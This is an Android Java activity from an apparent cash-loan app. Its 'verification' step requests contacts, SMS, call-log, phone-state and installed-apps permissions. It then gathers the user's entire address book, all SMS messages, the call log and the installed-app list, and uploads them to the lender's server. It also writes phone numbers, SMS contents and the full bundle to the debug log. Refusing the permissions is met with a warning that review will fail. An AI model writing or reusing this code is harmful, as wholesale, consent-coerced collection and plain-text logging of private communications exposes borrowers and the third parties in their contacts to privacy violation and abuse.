package com.idss.cashloans.ui.activity.Authentication;

import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.View;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.lifecycle.Observer;

import com.azhon.basic.base.BaseActivity;
import com.google.gson.Gson;
import com.idss.cashloans.api.moudle.AppBeans;
import com.idss.cashloans.api.moudle.Certification;
import com.idss.cashloans.api.utils.ContactsInfo;
import com.idss.cashloans.api.utils.LogUtil;
import com.idss.cashloans.databinding.ActivityStep2Binding;
import com.idss.cashloans.ui.ViewMoudle.Step2ActivityVM;

import java.util.ArrayList;
import java.util.List;

/**
 * 通讯信息
 */
public class Step2Activity extends BaseActivity<Step2ActivityVM, ActivityStep2Binding> {
    private final Certification Certification = new Certification();
    private static final String[] PERMISSIONS_STORAGE = {
            "android.permission.READ_CONTACTS",
            "android.permission.WRITE_CONTACTS",
            "android.permission.READ_SMS",
            "android.permission.GET_INSTALLED_APPS",
            "android.permission.READ_PHONE_STATE",
            "android.permission.READ_CALL_LOG",
            "android.permission.READ_CALL_LOG"
    };
    private static final int REQUEST_CODE = 1;
    private final List<Certification.AddressBookListDTO> addressBookListDTOList = new ArrayList<>();
    private Certification.AddressBookListDTO addressBookListDTO;


    @Override
    protected void onCreate(View view, Bundle savedInstanceState) {
        binding.ivBack.setOnClickListener(v -> finish());
    }

    @Override
    protected void initView() {
        //申请权限
        ActivityCompat.requestPermissions(Step2Activity.this, PERMISSIONS_STORAGE, REQUEST_CODE);

    }

    @Override
    protected void initData() {
        /**
         *   获取到APP列表
         */
        viewModel.getAppList().observe(this, new Observer<List<AppBeans>>() {
            @Override
            public void onChanged(List<AppBeans> appList) {
                Certification.setMemberAppList(appList);
                //2.获取通讯录
                viewModel.getContactsList(context);
            }
        });

        /**
         *   获取到通讯录
         */
        viewModel.getContactsInfo().observe(this, new Observer<ArrayList<ContactsInfo>>() {
            @Override
            public void onChanged(ArrayList<ContactsInfo> contactsInfos) {
                int size = contactsInfos.size();
                LogUtil.e("contactsInfos" + contactsInfos);
                for (int i = 0; i < size; i++) {
                    addressBookListDTO = new Certification.AddressBookListDTO();
                    addressBookListDTO.setContactPerson(contactsInfos.get(i).getDisplayName());
//                    addressBookListDTO.setCount();
//                    addressBookListDTO.setCreateBy(contactsInfos.get(i).get);
                    addressBookListDTO.setId(contactsInfos.get(i).getContactId());
//                    addressBookListDTO.setMemberId(contactsInfos.get(i).getContactsNumbers());
                    LogUtil.e(contactsInfos.get(i).getNumber());
                    addressBookListDTO.setPhone(contactsInfos.get(i).getNumber());
//                    addressBookListDTO.setRelation(contactsInfos.get(i).getRelationName());
                    addressBookListDTO.setRelationship(contactsInfos.get(i).getRelationName());
                    addressBookListDTO.setRemark(contactsInfos.get(i).getNote());
//                    addressBookListDTO.setSearchValue();
//                    addressBookListDTO.setTenantId();
                    addressBookListDTO.setType(contactsInfos.get(i).getNumberType());
//                    addressBookListDTO.setUpdateBy();
//                    addressBookListDTO.setUpdateTime();
                    addressBookListDTOList.add(addressBookListDTO);
                }
                Certification.setAddressBookList(addressBookListDTOList);


                //3.获取短信
                viewModel.getSmsInPhone(context);
            }
        });

        /**
         *   获取到短信
         */
        viewModel.getSmsList().observe(this, new Observer<List<Certification.MemberSmsListDTO>>() {
            @Override
            public void onChanged(List<Certification.MemberSmsListDTO> memberSmsListDTOS) {
                LogUtil.e("===memberSmsListDTOS===:"+new Gson().toJson(memberSmsListDTOS));
                Certification.setMemberSmsList(memberSmsListDTOS);

                //4.通话记录
                viewModel.getCallLogDataList(context);

                binding.progressBar.setVisibility(View.GONE);

            }
        });

        viewModel.getMemberCallLogList().observe(this, new Observer<List<com.idss.cashloans.api.moudle.Certification.MemberCallLogListDTO>>() {
            @Override
            public void onChanged(List<com.idss.cashloans.api.moudle.Certification.MemberCallLogListDTO> memberCallLogListDTOS) {
                Certification.setMemberCallLogList(memberCallLogListDTOS);

                LogUtil.e(new Gson().toJson(Certification));

                //5.上传数据
                viewModel.certification2(Step2Activity.this, Certification);
            }
        });


    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String permissions[], @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            //权限的申请结果返回
            case REQUEST_CODE: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    LogUtil.e("获取到权限");
                    //1.获取APP列表
                    try {
                        binding.progressBar.setVisibility(View.VISIBLE);
                        viewModel.getApplist(context);
                    } catch (PackageManager.NameNotFoundException e) {
                        throw new RuntimeException(e);
                    }

                } else {
                    //未授权
                    Toast.makeText(this, "申请通讯录权限被拒绝,这将导致审核失败！", Toast.LENGTH_SHORT).show();
                }
            }
            break;
        }
    }
}